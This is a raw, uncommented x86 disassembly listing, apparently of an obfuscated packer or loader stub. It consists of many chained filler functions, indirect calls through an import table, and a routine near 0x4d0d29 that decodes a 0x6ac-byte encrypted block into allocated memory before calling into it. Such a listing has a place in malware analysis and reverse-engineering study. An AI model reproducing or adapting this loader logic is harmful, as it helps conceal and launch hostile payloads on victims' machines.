  4d079e:	sub    DWORD PTR [ebp-0x20],0xfffffff9
  4d07a2:	mov    ebx,0x0
  4d07a7:	push   ebx
  4d07a8:	call   0x4d1410
  4d07ad:	add    esp,0x4
  4d07b0:	push   esi
  4d07b1:	push   DWORD PTR [esi+0x64]
  4d07b4:	push   ecx
  4d07b5:	push   DWORD PTR [esi+0x2c]
  4d07b8:	push   ecx
  4d07b9:	call   0x4d0740
  4d07be:	add    esp,0x10
  4d07c1:	pop    esi
  4d07c2:	push   0x0
  4d07c4:	call   0x4d0734
  4d07c9:	add    esp,0x4
  4d07cc:	add    esp,0x28
  4d07cf:	pop    ebp
  4d07d0:	ret    
  4d07d1:	add    BYTE PTR [eax],al
  4d07d3:	add    BYTE PTR [edi-0x1],bl
  4d07d6:	adc    eax,0x4d2020
  4d07db:	call   edi
  4d07dd:	add    BYTE PTR [eax],al
  4d07df:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d07e5:	sub    esp,0x4c
  4d07e8:	mov    edx,0x4d3050
  4d07ed:	or     ebx,DWORD PTR [ebp-0x20]
  4d07f0:	push   edx
  4d07f1:	mov    ebx,0x0
  4d07f6:	push   ebx
  4d07f7:	call   0x4d1410
  4d07fc:	add    esp,0x4
  4d07ff:	pop    edx
  4d0800:	push   edx
  4d0801:	push   DWORD PTR [edx+0x140]
  4d0807:	push   DWORD PTR [edx+0x17c]
  4d080d:	push   DWORD PTR [edx+0x1c0]
  4d0813:	call   0x4d149c
  4d0818:	add    esp,0xc
  4d081b:	pop    edx
  4d081c:	push   edx
  4d081d:	push   0x0
  4d081f:	call   0x4d1188
  4d0824:	add    esp,0x4
  4d0827:	pop    edx
  4d0828:	add    esp,0x4c
  4d082b:	pop    ebp
  4d082c:	ret    
  4d082d:	add    BYTE PTR [eax],al
  4d082f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0835:	sub    esp,0x20
  4d0838:	lea    edi,ds:0x4d3068
  4d083e:	xor    DWORD PTR [ebp-0x14],edi
  4d0841:	push   edi
  4d0842:	push   eax
  4d0843:	push   DWORD PTR [edi+0xcc]
  4d0849:	push   edx
  4d084a:	push   DWORD PTR [edi+0x74]
  4d084d:	call   0x4d0bf4
  4d0852:	add    esp,0x10
  4d0855:	pop    edi
  4d0856:	push   edi
  4d0857:	push   0x0
  4d0859:	call   0x4d089c
  4d085e:	add    esp,0x4
  4d0861:	pop    edi
  4d0862:	mov    ecx,0x4d2000
  4d0867:	mov    ecx,DWORD PTR [ecx]
  4d0869:	push   ecx
  4d086a:	push   DWORD PTR [edi-0x50]
  4d086d:	pop    ecx
  4d086e:	call   ecx
  4d0870:	add    esp,0x20
  4d0873:	pop    ebp
  4d0874:	ret    
  4d0875:	add    BYTE PTR [eax],al
  4d0877:	add    BYTE PTR [edi-0x1],bl
  4d087a:	adc    eax,0x4d2030
  4d087f:	call   edi
  4d0881:	add    BYTE PTR [eax],al
  4d0883:	add    BYTE PTR [edi-0x1],bl
  4d0886:	adc    eax,0x4d200c
  4d088b:	call   edi
  4d088d:	add    BYTE PTR [eax],al
  4d088f:	add    BYTE PTR [edi-0x1],bl
  4d0892:	adc    eax,0x4d2024
  4d0897:	call   edi
  4d0899:	add    BYTE PTR [eax],al
  4d089b:	add    BYTE PTR [edi-0x1],bl
  4d089e:	adc    eax,0x4d201c
  4d08a3:	call   edi
  4d08a5:	add    BYTE PTR [eax],al
  4d08a7:	add    BYTE PTR [edi-0x1],bl
  4d08aa:	adc    eax,0x4d2094
  4d08af:	call   edi
  4d08b1:	add    BYTE PTR [eax],al
  4d08b3:	add    BYTE PTR [edi-0x1],bl
  4d08b6:	adc    eax,0x4d202c
  4d08bb:	call   edi
  4d08bd:	add    BYTE PTR [eax],al
  4d08bf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08c5:	sub    esp,0x50
  4d08c8:	lea    esi,[ecx-0x84]
  4d08ce:	and    DWORD PTR [esi+0xd0],edx
  4d08d4:	mov    ebx,0x0
  4d08d9:	push   ebx
  4d08da:	call   0x4d1410
  4d08df:	add    esp,0x4
  4d08e2:	push   esi
  4d08e3:	push   DWORD PTR [esi+0x124]
  4d08e9:	push   DWORD PTR [esi+0x70]
  4d08ec:	push   edx
  4d08ed:	push   eax
  4d08ee:	call   0x4d10cc
  4d08f3:	add    esp,0x10
  4d08f6:	pop    esi
  4d08f7:	push   0x0
  4d08f9:	call   0x4d1490
  4d08fe:	add    esp,0x4
  4d0901:	add    esp,0x50
  4d0904:	pop    ebp
  4d0905:	ret    
  4d0906:	add    BYTE PTR [eax],al
  4d0908:	mov    edi,edi
  4d090a:	push   ebp
  4d090b:	mov    ebp,esp
  4d090d:	sub    esp,0x48
  4d0910:	lea    eax,[esi-0x60]
  4d0913:	mov    DWORD PTR [ebp-0x38],0x3d89
  4d091a:	push   eax
  4d091b:	lea    edx,[eax-0x10]
  4d091e:	push   edx
  4d091f:	call   0x4d1114
  4d0924:	add    esp,0x4
  4d0927:	test   eax,eax
  4d0929:	jne    0x4d091b
  4d092b:	pop    eax
  4d092c:	push   eax
  4d092d:	push   edx
  4d092e:	push   esi
  4d092f:	push   DWORD PTR [eax+0x44]
  4d0932:	call   0x4d09d8
  4d0937:	add    esp,0xc
  4d093a:	pop    eax
  4d093b:	push   eax
  4d093c:	mov    edx,0x0
  4d0941:	push   edx
  4d0942:	call   0x4d089c
  4d0947:	add    esp,0x4
  4d094a:	pop    eax
  4d094b:	add    esp,0x48
  4d094e:	pop    ebp
  4d094f:	ret    
  4d0950:	mov    edi,edi
  4d0952:	push   ebp
  4d0953:	mov    ebp,esp
  4d0955:	sub    esp,0x48
  4d0958:	lea    edx,[ebx-0x54]
  4d095b:	or     DWORD PTR [ebp-0x2c],edi
  4d095e:	push   edx
  4d095f:	push   DWORD PTR [edx+0x54]
  4d0962:	push   DWORD PTR [edx+0xd0]
  4d0968:	call   0x4d1278
  4d096d:	add    esp,0x8
  4d0970:	pop    edx
  4d0971:	push   edx
  4d0972:	mov    ecx,0x0
  4d0977:	push   ecx
  4d0978:	call   0x4d1188
  4d097d:	add    esp,0x4
  4d0980:	pop    edx
  4d0981:	push   edx
  4d0982:	mov    edx,0x0
  4d0987:	push   edx
  4d0988:	call   0x4d1194
  4d098d:	add    esp,0x4
  4d0990:	pop    edx
  4d0991:	add    esp,0x48
  4d0994:	pop    ebp
  4d0995:	ret    
  4d0996:	add    BYTE PTR [eax],al
  4d0998:	mov    edi,edi
  4d099a:	push   ebp
  4d099b:	mov    ebp,esp
  4d099d:	sub    esp,0x4c
  4d09a0:	lea    ebx,[eax-0x2c]
  4d09a3:	mov    DWORD PTR [ebp-0x48],eax
  4d09a6:	push   ebx
  4d09a7:	push   eax
  4d09a8:	push   DWORD PTR [ebx+0x64]
  4d09ab:	call   0x4d14e4
  4d09b0:	add    esp,0x8
  4d09b3:	pop    ebx
  4d09b4:	call   0x4d103c
  4d09b9:	add    esp,0x4
  4d09bc:	push   0x0
  4d09be:	call   0x4d1484
  4d09c3:	add    esp,0x4
  4d09c6:	add    esp,0x4c
  4d09c9:	pop    ebp
  4d09ca:	ret    
  4d09cb:	add    BYTE PTR [edi-0x1],bl
  4d09ce:	adc    eax,0x4d2088
  4d09d3:	call   edi
  4d09d5:	add    BYTE PTR [eax],al
  4d09d7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d09dd:	sub    esp,0x3c
  4d09e0:	lea    edi,ds:0x4d3080
  4d09e6:	cmp    edi,0x7179
  4d09ec:	je     0x4d09db
  4d09ee:	push   edi
  4d09ef:	push   DWORD PTR [edi+0xc8]
  4d09f5:	push   DWORD PTR [edi+0xcc]
  4d09fb:	push   eax
  4d09fc:	call   0x4d1234
  4d0a01:	add    esp,0xc
  4d0a04:	pop    edi
  4d0a05:	push   edi
  4d0a06:	mov    ecx,0x0
  4d0a0b:	push   ecx
  4d0a0c:	call   0x4d1188
  4d0a11:	add    esp,0x4
  4d0a14:	pop    edi
  4d0a15:	push   edi
  4d0a16:	push   0x0
  4d0a18:	call   0x4d1484
  4d0a1d:	add    esp,0x4
  4d0a20:	pop    edi
  4d0a21:	add    esp,0x3c
  4d0a24:	pop    ebp
  4d0a25:	ret    
  4d0a26:	add    BYTE PTR [eax],al
  4d0a28:	mov    edi,edi
  4d0a2a:	push   ebp
  4d0a2b:	mov    ebp,esp
  4d0a2d:	sub    esp,0x58
  4d0a30:	mov    eax,0x4d31e0
  4d0a35:	xor    esi,DWORD PTR [eax-0xf8]
  4d0a3b:	push   eax
  4d0a3c:	push   DWORD PTR [eax+0x1ec]
  4d0a42:	push   ecx
  4d0a43:	push   DWORD PTR [eax+0x1ec]
  4d0a49:	push   edx
  4d0a4a:	call   0x4d0fb4
  4d0a4f:	add    esp,0x10
  4d0a52:	pop    eax
  4d0a53:	push   eax
  4d0a54:	call   0x4d103c
  4d0a59:	add    esp,0x4
  4d0a5c:	pop    eax
  4d0a5d:	push   eax
  4d0a5e:	push   0x0
  4d0a60:	call   0x4d1164
  4d0a65:	add    esp,0x4
  4d0a68:	pop    eax
  4d0a69:	add    esp,0x58
  4d0a6c:	pop    ebp
  4d0a6d:	ret    
  4d0a6e:	add    BYTE PTR [eax],al
  4d0a70:	mov    edi,edi
  4d0a72:	push   ebp
  4d0a73:	mov    ebp,esp
  4d0a75:	sub    esp,0x34
  4d0a78:	mov    eax,0x4d3178
  4d0a7d:	adc    ecx,0xffffffbd
  4d0a80:	push   eax
  4d0a81:	mov    edi,0x0
  4d0a86:	push   edi
  4d0a87:	call   0x4d089c
  4d0a8c:	add    esp,0x4
  4d0a8f:	pop    eax
  4d0a90:	push   eax
  4d0a91:	push   DWORD PTR [eax+0x178]
  4d0a97:	push   DWORD PTR [eax+0x144]
  4d0a9d:	call   0x4d07e0
  4d0aa2:	add    esp,0x8
  4d0aa5:	pop    eax
  4d0aa6:	push   eax
  4d0aa7:	mov    ecx,0x0
  4d0aac:	push   ecx
  4d0aad:	call   0x4d1410
  4d0ab2:	add    esp,0x4
  4d0ab5:	pop    eax
  4d0ab6:	add    esp,0x34
  4d0ab9:	pop    ebp
  4d0aba:	ret    
  4d0abb:	add    BYTE PTR [edi-0x1],bl
  4d0abe:	adc    eax,0x4d2070
  4d0ac3:	call   edi
  4d0ac5:	add    BYTE PTR [eax],al
  4d0ac7:	add    BYTE PTR [edi-0x1],bl
  4d0aca:	adc    eax,0x4d209c
  4d0acf:	call   edi
  4d0ad1:	add    BYTE PTR [eax],al
  4d0ad3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ad9:	sub    esp,0x3c
  4d0adc:	lea    eax,ds:0x4d30e0
  4d0ae2:	and    edi,DWORD PTR [ebp-0x18]
  4d0ae5:	push   eax
  4d0ae6:	push   ebx
  4d0ae7:	push   DWORD PTR [eax+0x1e8]
  4d0aed:	call   0x4d1428
  4d0af2:	add    esp,0x8
  4d0af5:	pop    eax
  4d0af6:	push   eax
  4d0af7:	call   0x4d0d18
  4d0afc:	add    esp,0x4
  4d0aff:	pop    eax
  4d0b00:	push   eax
  4d0b01:	push   0x0
  4d0b03:	call   0x4d0734
  4d0b08:	add    esp,0x4
  4d0b0b:	pop    eax
  4d0b0c:	add    esp,0x3c
  4d0b0f:	pop    ebp
  4d0b10:	ret    
  4d0b11:	add    BYTE PTR [eax],al
  4d0b13:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b19:	sub    esp,0x58
  4d0b1c:	lea    ecx,[eax+0x8]
  4d0b1f:	or     edi,DWORD PTR [ecx-0x4]
  4d0b22:	push   ecx
  4d0b23:	push   0x0
  4d0b25:	call   0x4d1490
  4d0b2a:	add    esp,0x4
  4d0b2d:	pop    ecx
  4d0b2e:	push   ecx
  4d0b2f:	push   edx
  4d0b30:	push   DWORD PTR [ecx+0x1fc]
  4d0b36:	push   DWORD PTR [ecx+0x80]
  4d0b3c:	call   0x4d0a28
  4d0b41:	add    esp,0xc
  4d0b44:	pop    ecx
  4d0b45:	push   ecx
  4d0b46:	call   0x4d0d18
  4d0b4b:	add    esp,0x4
  4d0b4e:	pop    ecx
  4d0b4f:	add    esp,0x58
  4d0b52:	pop    ebp
  4d0b53:	ret    
  4d0b54:	mov    edi,edi
  4d0b56:	push   ebp
  4d0b57:	mov    ebp,esp
  4d0b59:	sub    esp,0x54
  4d0b5c:	lea    ecx,[esi]
  4d0b5e:	sbb    DWORD PTR [ecx-0xf8],esi
  4d0b64:	push   ecx
  4d0b65:	call   0x4d0ea8
  4d0b6a:	add    esp,0x4
  4d0b6d:	pop    ecx
  4d0b6e:	push   ecx
  4d0b6f:	push   edi
  4d0b70:	push   ebx
  4d0b71:	push   DWORD PTR [ecx+0xbc]
  4d0b77:	push   edi
  4d0b78:	call   0x4d0ad4
  4d0b7d:	add    esp,0x10
  4d0b80:	pop    ecx
  4d0b81:	push   ecx
  4d0b82:	mov    edx,0x0
  4d0b87:	push   edx
  4d0b88:	call   0x4d1194
  4d0b8d:	add    esp,0x4
  4d0b90:	pop    ecx
  4d0b91:	add    esp,0x54
  4d0b94:	pop    ebp
  4d0b95:	ret    
  4d0b96:	add    BYTE PTR [eax],al
  4d0b98:	mov    edi,edi
  4d0b9a:	push   ebp
  4d0b9b:	mov    ebp,esp
  4d0b9d:	sub    esp,0x60
  4d0ba0:	lea    eax,ds:0x4d3110
  4d0ba6:	sub    DWORD PTR [ebp-0xc],0xffffe43b
  4d0bad:	push   eax
  4d0bae:	push   DWORD PTR [eax+0x154]
  4d0bb4:	push   edi
  4d0bb5:	call   0x4d1120
  4d0bba:	add    esp,0x8
  4d0bbd:	pop    eax
  4d0bbe:	push   eax
  4d0bbf:	push   0xfffffff4
  4d0bc1:	call   0x4d0e48
  4d0bc6:	add    esp,0x4
  4d0bc9:	pop    eax
  4d0bca:	push   eax
  4d0bcb:	call   0x4d0d18
  4d0bd0:	add    esp,0x4
  4d0bd3:	pop    eax
  4d0bd4:	add    esp,0x60
  4d0bd7:	pop    ebp
  4d0bd8:	ret    
  4d0bd9:	add    BYTE PTR [eax],al
  4d0bdb:	add    BYTE PTR [edi-0x1],bl
  4d0bde:	adc    eax,0x4d2008
  4d0be3:	call   edi
  4d0be5:	add    BYTE PTR [eax],al
  4d0be7:	add    BYTE PTR [edi-0x1],bl
  4d0bea:	adc    eax,0x4d2078
  4d0bef:	call   edi
  4d0bf1:	add    BYTE PTR [eax],al
  4d0bf3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0bf9:	sub    esp,0x40
  4d0bfc:	mov    ebx,0x4d308c
  4d0c01:	sub    ecx,esi
  4d0c03:	push   ebx
  4d0c04:	push   edi
  4d0c05:	push   DWORD PTR [ebx]
  4d0c07:	push   DWORD PTR [ebx+0x4]
  4d0c0a:	push   DWORD PTR [ebx+0x10]
  4d0c0d:	call   0x4d1364
  4d0c12:	add    esp,0x10
  4d0c15:	pop    ebx
  4d0c16:	push   0x0
  4d0c18:	call   0x4d1410
  4d0c1d:	add    esp,0x4
  4d0c20:	push   0x0
  4d0c22:	call   0x4d1410
  4d0c27:	add    esp,0x4
  4d0c2a:	add    esp,0x40
  4d0c2d:	pop    ebp
  4d0c2e:	ret    
  4d0c2f:	add    BYTE PTR [edi+0x2b],dl
  4d0c32:	call   DWORD PTR [edi+0x57]
  4d0c35:	push   edi
  4d0c36:	push   edi
  4d0c37:	call   0x4d103c
  4d0c3c:	sub    esp,0xfffffffc
  4d0c3f:	call   0x4d0890
  4d0c44:	push   0x2
  4d0c46:	xor    eax,eax
  4d0c48:	adc    eax,0x4d3030
  4d0c4d:	push   0x0
  4d0c4f:	xor    ecx,ecx
  4d0c51:	adc    ecx,0x4d3036
  4d0c57:	add    BYTE PTR [ecx],0x41
  4d0c5a:	push   eax
  4d0c5b:	call   0x4d156c
  4d0c60:	pop    edi
  4d0c61:	pop    edi
  4d0c62:	pop    edi
  4d0c63:	lea    edi,[eax+0x3b]
  4d0c66:	mov    edi,DWORD PTR [edi]
  4d0c68:	lea    eax,[eax+edi*1]
  4d0c6b:	mov    eax,DWORD PTR [eax+0x28]
  4d0c6e:	pusha  
  4d0c6f:	mov    ah,0x45
  4d0c71:	sub    al,ah
  4d0c73:	ja     0x4d0830
  4d0c79:	popa   
  4d0c7a:	ret    
  4d0c7b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c81:	sub    esp,0x50
  4d0c84:	lea    edx,ds:0x4d3190
  4d0c8a:	xor    DWORD PTR [edx-0x13c],0xffffff8e
  4d0c91:	push   edx
  4d0c92:	mov    eax,0x0
  4d0c97:	push   eax
  4d0c98:	call   0x4d1484
  4d0c9d:	add    esp,0x4
  4d0ca0:	pop    edx
  4d0ca1:	push   edx
  4d0ca2:	push   ebx
  4d0ca3:	push   ebx
  4d0ca4:	push   DWORD PTR [edx+0x130]
  4d0caa:	call   0x4d0f1c
  4d0caf:	add    esp,0xc
  4d0cb2:	pop    edx
  4d0cb3:	push   edx
  4d0cb4:	mov    ebx,0x0
  4d0cb9:	push   ebx
  4d0cba:	call   0x4d1164
  4d0cbf:	add    esp,0x4
  4d0cc2:	pop    edx
  4d0cc3:	add    esp,0x50
  4d0cc6:	pop    ebp
  4d0cc7:	ret    
  4d0cc8:	pop    edi
  4d0cc9:	call   DWORD PTR ds:0x4d2080
  4d0ccf:	call   edi
  4d0cd1:	add    BYTE PTR [eax],al
  4d0cd3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0cd9:	sub    esp,0x48
  4d0cdc:	lea    esi,ds:0x4d30a8
  4d0ce2:	or     eax,0xffffbf92
  4d0ce7:	mov    edx,0x0
  4d0cec:	push   edx
  4d0ced:	call   0x4d1410
  4d0cf2:	add    esp,0x4
  4d0cf5:	push   esi
  4d0cf6:	push   edi
  4d0cf7:	push   DWORD PTR [esi+0x20]
  4d0cfa:	push   eax
  4d0cfb:	push   DWORD PTR [esi+0x1c]
  4d0cfe:	call   0x4d12d0
  4d0d03:	add    esp,0x10
  4d0d06:	pop    esi
  4d0d07:	push   0x0
  4d0d09:	call   0x4d07d4
  4d0d0e:	add    esp,0x4
  4d0d11:	add    esp,0x48
  4d0d14:	pop    ebp
  4d0d15:	ret    
  4d0d16:	add    BYTE PTR [eax],al
  4d0d18:	pop    edi
  4d0d19:	call   DWORD PTR ds:0x4d2040
  4d0d1f:	call   edi
  4d0d21:	add    BYTE PTR [eax],al
  4d0d23:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d29:	sub    esp,0x40
  4d0d2c:	sbb    ecx,DWORD PTR [ebp-0x1c]
  4d0d2f:	mov    edi,0x4d3058
  4d0d34:	push   edi
  4d0d35:	push   0x6ac
  4d0d3a:	push   0x6ac
  4d0d3f:	mov    eax,0x40001
  4d0d44:	push   eax
  4d0d45:	mov    eax,0x862985a6
  4d0d4a:	push   DWORD PTR [eax+0x7a239a86]
  4d0d50:	sub    DWORD PTR [esp],0x2
  4d0d54:	mov    eax,0x4d2044
  4d0d59:	pop    DWORD PTR [eax]
  4d0d5b:	call   0x4d156c
  4d0d60:	add    esp,0x4
  4d0d63:	xchg   DWORD PTR [esp],eax
  4d0d66:	mov    edi,eax
  4d0d68:	pop    DWORD PTR [edi-0x40]
  4d0d6b:	mov    ebx,DWORD PTR [edi-0x40]
  4d0d6e:	lea    esi,[ebx]
  4d0d70:	sub    ebx,ebx
  4d0d72:	dec    ebx
  4d0d73:	and    ebx,0x4d0014
  4d0d79:	mov    ecx,0xd5d9a824
  4d0d7e:	xor    eax,eax
  4d0d80:	cmp    eax,0x6ac
  4d0d85:	je     0x4d0da3
  4d0d87:	sub    eax,0xfffffffc
  4d0d8a:	xor    edx,edx
  4d0d8c:	push   DWORD PTR [ebx+edx*1]
  4d0d8f:	add    DWORD PTR [esp],ecx
  4d0d92:	pop    DWORD PTR [esi+edx*2]
  4d0d95:	dec    DWORD PTR [esi]
  4d0d97:	xor    ecx,ecx
  4d0d99:	add    ecx,DWORD PTR [ebx]
  4d0d9b:	add    ebx,0x4
  4d0d9e:	add    esi,0x4
  4d0da1:	jmp    0x4d0d80
  4d0da3:	push   edi
  4d0da4:	call   0x4d0ea8
  4d0da9:	add    esp,0x4
  4d0dac:	pop    edi
  4d0dad:	add    esp,0x40
  4d0db0:	pop    ebp
  4d0db1:	ret    
  4d0db2:	add    BYTE PTR [eax],al
  4d0db4:	mov    edi,edi
  4d0db6:	push   ebp
  4d0db7:	mov    ebp,esp
  4d0db9:	sub    esp,0x58
  4d0dbc:	lea    ebx,ds:0x4d30bc
  4d0dc2:	xor    DWORD PTR [ebp-0x8],esi
  4d0dc5:	push   ebx
  4d0dc6:	push   edx
  4d0dc7:	push   DWORD PTR [ebx+0x164]
  4d0dcd:	push   DWORD PTR [ebx+0x14c]
  4d0dd3:	push   DWORD PTR [ebx+0xc]
  4d0dd6:	call   0x4d0e60
  4d0ddb:	add    esp,0x10
  4d0dde:	pop    ebx
  4d0ddf:	push   0x0
  4d0de1:	call   0x4d0df8
  4d0de6:	add    esp,0x4
  4d0de9:	call   0x4d103c
  4d0dee:	add    esp,0x4
  4d0df1:	add    esp,0x58
  4d0df4:	pop    ebp
  4d0df5:	ret    
  4d0df6:	add    BYTE PTR [eax],al
  4d0df8:	pop    edi
  4d0df9:	call   DWORD PTR ds:0x4d2048
  4d0dff:	call   edi
  4d0e01:	add    BYTE PTR [eax],al
  4d0e03:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e09:	sub    esp,0x60
  4d0e0c:	lea    edx,[ebx-0x10c]
  4d0e12:	adc    esi,eax
  4d0e14:	push   edx
  4d0e15:	mov    edx,0x0
  4d0e1a:	push   edx
  4d0e1b:	call   0x4d0734
  4d0e20:	add    esp,0x4
  4d0e23:	pop    edx
  4d0e24:	push   edx
  4d0e25:	push   ebx
  4d0e26:	push   ecx
  4d0e27:	push   DWORD PTR [edx+0x168]
  4d0e2d:	push   edi
  4d0e2e:	call   0x4d0a70
  4d0e33:	add    esp,0x10
  4d0e36:	pop    edx
  4d0e37:	push   edx
  4d0e38:	push   0x0
  4d0e3a:	call   0x4d1164
  4d0e3f:	add    esp,0x4
  4d0e42:	pop    edx
  4d0e43:	add    esp,0x60
  4d0e46:	pop    ebp
  4d0e47:	ret    
  4d0e48:	pop    edi
  4d0e49:	call   DWORD PTR ds:0x4d2028
  4d0e4f:	call   edi
  4d0e51:	add    BYTE PTR [eax],al
  4d0e53:	add    BYTE PTR [edi-0x1],bl
  4d0e56:	adc    eax,0x4d2084
  4d0e5b:	call   edi
  4d0e5d:	add    BYTE PTR [eax],al
  4d0e5f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e65:	sub    esp,0x5c
  4d0e68:	mov    eax,0x4d3134
  4d0e6d:	or     DWORD PTR [ebp-0x8],0x6735
  4d0e74:	push   eax
  4d0e75:	call   0x4d0ea8
  4d0e7a:	add    esp,0x4
  4d0e7d:	pop    eax
  4d0e7e:	push   eax
  4d0e7f:	push   DWORD PTR [eax+0x54]
  4d0e82:	push   edi
  4d0e83:	push   DWORD PTR [eax+0x1bc]
  4d0e89:	push   ecx
  4d0e8a:	call   0x4d1578
  4d0e8f:	add    esp,0x10
  4d0e92:	pop    eax
  4d0e93:	push   eax
  4d0e94:	mov    ecx,0xfffffff4
  4d0e99:	push   ecx
  4d0e9a:	call   0x4d0e48
  4d0e9f:	add    esp,0x4
  4d0ea2:	pop    eax
  4d0ea3:	add    esp,0x5c
  4d0ea6:	pop    ebp
  4d0ea7:	ret    
  4d0ea8:	pop    edi
  4d0ea9:	call   DWORD PTR ds:0x4d2038
  4d0eaf:	call   edi
  4d0eb1:	add    BYTE PTR [eax],al
  4d0eb3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0eb9:	sub    esp,0x44
  4d0ebc:	lea    ebx,[esi+0xa8]
  4d0ec2:	add    DWORD PTR [ebp-0x24],ebx
  4d0ec5:	push   0x0
  4d0ec7:	call   0x4d089c
  4d0ecc:	add    esp,0x4
  4d0ecf:	push   ebx
  4d0ed0:	push   edx
  4d0ed1:	push   DWORD PTR [ebx+0x84]
  4d0ed7:	push   DWORD PTR [ebx+0x170]
  4d0edd:	call   0x4d0950
  4d0ee2:	add    esp,0xc
  4d0ee5:	pop    ebx
  4d0ee6:	push   0x0
  4d0ee8:	call   0x4d089c
  4d0eed:	add    esp,0x4
  4d0ef0:	add    esp,0x44
  4d0ef3:	pop    ebp
  4d0ef4:	ret    
  4d0ef5:	add    BYTE PTR [eax],al
  4d0ef7:	add    BYTE PTR [edi-0x1],bl
  4d0efa:	adc    eax,0x4d2064
  4d0eff:	call   edi
  4d0f01:	add    BYTE PTR [eax],al
  4d0f03:	add    BYTE PTR [edi-0x1],bl
  4d0f06:	adc    eax,0x4d2058
  4d0f0b:	call   edi
  4d0f0d:	add    BYTE PTR [eax],al
  4d0f0f:	add    BYTE PTR [edi-0x1],bl
  4d0f12:	adc    eax,0x4d208c
  4d0f17:	call   edi
  4d0f19:	add    BYTE PTR [eax],al
  4d0f1b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f21:	sub    esp,0x24
  4d0f24:	lea    eax,ds:0x4d319c
  4d0f2a:	or     DWORD PTR [ebp-0xc],0x74ba
  4d0f31:	push   eax
  4d0f32:	push   DWORD PTR [eax+0xa8]
  4d0f38:	push   DWORD PTR [eax+0x128]
  4d0f3e:	push   DWORD PTR [eax+0x34]
  4d0f41:	call   0x4d0d24
  4d0f46:	add    esp,0xc
  4d0f49:	pop    eax
  4d0f4a:	push   eax
  4d0f4b:	push   0x0
  4d0f4d:	call   0x4d1194
  4d0f52:	add    esp,0x4
  4d0f55:	pop    eax
  4d0f56:	push   eax
  4d0f57:	mov    edx,0x0
  4d0f5c:	push   edx
  4d0f5d:	call   0x4d1164
  4d0f62:	add    esp,0x4
  4d0f65:	pop    eax
  4d0f66:	add    esp,0x24
  4d0f69:	pop    ebp
  4d0f6a:	ret    
  4d0f6b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f71:	sub    esp,0x20
  4d0f74:	lea    eax,ds:0x4d308c
  4d0f7a:	add    esi,DWORD PTR [ebp-0x1c]
  4d0f7d:	push   eax
  4d0f7e:	push   ebx
  4d0f7f:	push   DWORD PTR [eax+0x20]
  4d0f82:	call   0x4d0b14
  4d0f87:	add    esp,0x8
  4d0f8a:	pop    eax
  4d0f8b:	push   eax
  4d0f8c:	push   0x0
  4d0f8e:	call   0x4d0734
  4d0f93:	add    esp,0x4
  4d0f96:	pop    eax
  4d0f97:	push   eax
  4d0f98:	push   0x0
  4d0f9a:	call   0x4d07d4
  4d0f9f:	add    esp,0x4
  4d0fa2:	pop    eax
  4d0fa3:	add    esp,0x20
  4d0fa6:	pop    ebp
  4d0fa7:	ret    
  4d0fa8:	pop    edi
  4d0fa9:	call   DWORD PTR ds:0x4d20a0
  4d0faf:	call   edi
  4d0fb1:	add    BYTE PTR [eax],al
  4d0fb3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0fb9:	sub    esp,0x58
  4d0fbc:	lea    ecx,ds:0x4d313c
  4d0fc2:	or     DWORD PTR [ecx-0x10],0xffffad9e
  4d0fc9:	push   ecx
  4d0fca:	push   0x0
  4d0fcc:	call   0x4d0df8
  4d0fd1:	add    esp,0x4
  4d0fd4:	pop    ecx
  4d0fd5:	push   ecx
  4d0fd6:	push   DWORD PTR [ecx+0x38]
  4d0fd9:	push   DWORD PTR [ecx+0x30]
  4d0fdc:	call   0x4d11a0
  4d0fe1:	add    esp,0x8
  4d0fe4:	pop    ecx
  4d0fe5:	push   ecx
  4d0fe6:	mov    edi,0x0
  4d0feb:	push   edi
  4d0fec:	call   0x4d1410
  4d0ff1:	add    esp,0x4
  4d0ff4:	pop    ecx
  4d0ff5:	add    esp,0x58
  4d0ff8:	pop    ebp
  4d0ff9:	ret    
  4d0ffa:	add    BYTE PTR [eax],al
  4d0ffc:	mov    edi,edi
  4d0ffe:	push   ebp
  4d0fff:	mov    ebp,esp
  4d1001:	sub    esp,0x20
  4d1004:	mov    esi,0x4d3070
  4d1009:	adc    DWORD PTR [ebp-0xc],ecx
  4d100c:	push   esi
  4d100d:	push   DWORD PTR [esi+0x138]
  4d1013:	push   DWORD PTR [esi+0x70]
  4d1016:	push   ebx
  4d1017:	call   0x4d0908
  4d101c:	add    esp,0xc
  4d101f:	pop    esi
  4d1020:	push   0x0
  4d1022:	call   0x4d1490
  4d1027:	add    esp,0x4
  4d102a:	push   0x0
  4d102c:	call   0x4d1484
  4d1031:	add    esp,0x4
  4d1034:	add    esp,0x20
  4d1037:	pop    ebp
  4d1038:	ret    
  4d1039:	add    BYTE PTR [eax],al
  4d103b:	add    BYTE PTR [edi-0x1],bl
  4d103e:	adc    eax,0x4d2010
  4d1043:	call   edi
  4d1045:	add    BYTE PTR [eax],al
  4d1047:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d104d:	sub    esp,0x5c
  4d1050:	lea    edx,ds:0x4d3154
  4d1056:	sub    edi,esi
  4d1058:	push   edx
  4d1059:	call   0x4d103c
  4d105e:	add    esp,0x4
  4d1061:	pop    edx
  4d1062:	push   edx
  4d1063:	push   eax
  4d1064:	push   esi
  4d1065:	push   DWORD PTR [edx+0x170]
  4d106b:	push   esi
  4d106c:	call   0x4d0db4
  4d1071:	add    esp,0x10
  4d1074:	pop    edx
  4d1075:	push   edx
  4d1076:	push   0x0
  4d1078:	call   0x4d0df8
  4d107d:	add    esp,0x4
  4d1080:	pop    edx
  4d1081:	add    esp,0x5c
  4d1084:	pop    ebp
  4d1085:	ret    
  4d1086:	add    BYTE PTR [eax],al
  4d1088:	mov    edi,edi
  4d108a:	push   ebp
  4d108b:	mov    ebp,esp
  4d108d:	sub    esp,0x20
  4d1090:	lea    esi,ds:0x4d3198
